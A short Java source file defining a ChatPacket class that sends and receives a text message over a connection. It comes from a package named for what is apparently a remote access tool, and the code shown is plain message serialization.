package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;

public final class ChatPacket implements IPacket {
	
	private String message;
	
	public ChatPacket(final String message) {
		this.message = message;
	}
	
	public ChatPacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUTF(message);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		message = connection.readUTF();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		//...
	}
	
	public String getMessage() {
		return message;
	}
	
}
